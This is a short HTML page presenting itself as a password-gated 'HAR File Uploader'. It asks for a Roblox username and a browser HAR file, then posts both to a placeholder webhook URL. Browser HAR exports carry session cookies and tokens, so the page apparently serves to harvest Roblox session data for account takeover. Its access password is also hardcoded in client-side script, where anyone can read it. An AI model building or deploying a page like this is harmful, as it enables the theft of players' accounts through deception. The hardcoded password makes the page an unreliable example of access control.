<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>HAR File Uploader</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', sans-serif;
      background-color: #121212;
      color: #ffffff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      text-align: center;
      background-color: #1e1e1e;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 0 12px rgba(0,0,0,0.6);
      width: 90%;
      max-width: 400px;
    }

    input[type="password"],
    input[type="text"],
    input[type="file"] {
      padding: 10px;
      margin: 10px 0;
      width: 100%;
      border: none;
      border-radius: 6px;
      background-color: #2c2c2c;
      color: white;
    }

    button {
      padding: 10px 20px;
      background-color: #3b82f6;
      border: none;
      border-radius: 6px;
      color: white;
      cursor: pointer;
      transition: background-color 0.3s;
      margin-top: 10px;
    }

    button:hover {
      background-color: #2563eb;
    }

    .hidden {
      display: none;
    }

    .error {
      color: #f87171;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <div id="password-section">
      <h2>Enter Password</h2>
      <input type="password" id="password" placeholder="Enter password" />
      <button onclick="checkPassword()">Submit</button>
      <div class="error" id="error-message" style="display: none;">Incorrect password. Try again.</div>
    </div>

    <div id="upload-section" class="hidden">
      <h2>Upload HAR File</h2>
      <input type="text" placeholder="Enter Roblox Username" id="username" />
      <input type="file" id="har-file" accept=".har" />
      <button onclick="uploadFile()">Upload</button>
    </div>
  </div>

  <script>
    const correctPassword = "EchoTrails2025";

    function checkPassword() {
      const passwordInput = document.getElementById("password").value;
      const errorMessage = document.getElementById("error-message");

      if (passwordInput === correctPassword) {
        document.getElementById("password-section").classList.add("hidden");
        document.getElementById("upload-section").classList.remove("hidden");
        errorMessage.style.display = "none";
      } else {
        errorMessage.style.display = "block";
      }
    }

    function uploadFile() {
      const fileInput = document.getElementById("har-file");
      const username = document.getElementById("username").value;

      if (!fileInput.files.length || !username) {
        alert("Please enter a username and select a HAR file.");
        return;
      }

      const file = fileInput.files[0];
      const formData = new FormData();
      formData.append("file", file);
      formData.append("username", username);

      // Replace this with the actual webhook/API destination
      fetch("https://your-webhook-or-server-url", {
        method: "POST",
        body: formData
      })
      .then(() => alert("File uploaded successfully."))
      .catch(() => alert("Error uploading file."));
    }
  </script>
</body>
</html>
